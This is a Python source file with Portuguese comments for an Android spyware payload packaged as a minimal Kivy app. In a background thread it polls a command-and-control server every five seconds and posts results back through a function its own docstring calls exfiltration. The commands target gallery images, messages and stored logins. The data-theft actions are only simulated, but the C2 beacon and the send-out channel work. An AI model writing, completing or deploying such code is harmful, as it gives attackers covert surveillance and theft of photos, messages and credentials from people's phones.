import requests
import time
import json

# URL do servidor C2 (Comando e Controle)
# O endereço real será configurado no buildozer.spec ou via injeção de variável
C2_SERVER_URL = "http://127.0.0.1:8080" # Placeholder, será alterado

def get_commands():
    """Busca comandos no servidor C2."""
    try:
        response = requests.get(f"{C2_SERVER_URL}/get_command", timeout=10)
        if response.status_code == 200:
            return response.json().get("command", "NO_COMMAND")
        return "NO_COMMAND"
    except requests.exceptions.RequestException:
        return "ERROR_C2_UNREACHABLE"

def send_data(data):
    """Envia dados exfiltrados para o servidor C2."""
    try:
        requests.post(f"{C2_SERVER_URL}/send_data", json={"data": data}, timeout=10)
    except requests.exceptions.RequestException:
        pass # Ignora erros de conexão para não travar o payload

def execute_command(command):
    """Simula a execução de um comando de exfiltração de dados."""
    if command == "GET_GALLERY_IMAGES":
        result = "Comando de [GET_GALLERY_IMAGES] enviado. Aguardando exfiltração de dados do payload..."
    elif command == "READ_MESSAGES":
        result = "Comando de [READ_MESSAGES] enviado. Aguardando exfiltração de dados do payload..."
    elif command == "EXTRACT_LOGINS":
        result = "Comando de [EXTRACT_LOGINS] enviado. Aguardando exfiltração de dados do payload..."
    else:
        result = f"Comando desconhecido: {command}"
    
    # Envia o status de volta ao C2
    send_data({"status": "command_executed", "result": result})

def main_loop():
    """Loop principal do payload."""
    while True:
        command = get_commands()
        if command not in ["NO_COMMAND", "ERROR_C2_UNREACHABLE"]:
            execute_command(command)
        
        # Espera um tempo antes de checar novamente
        time.sleep(5)

if __name__ == '__main__':
    # Adiciona a interface Kivy mínima para que o Buildozer funcione
    # O payload real não precisa de interface, mas o Buildozer exige um app Kivy
    from kivy.app import App
    from kivy.uix.label import Label
    from threading import Thread

    class PayloadApp(App):
        def build(self):
            # Inicia o loop principal em uma thread separada
            Thread(target=main_loop).start()
            return Label(text='Payload em execução em segundo plano...')

    PayloadApp().run()
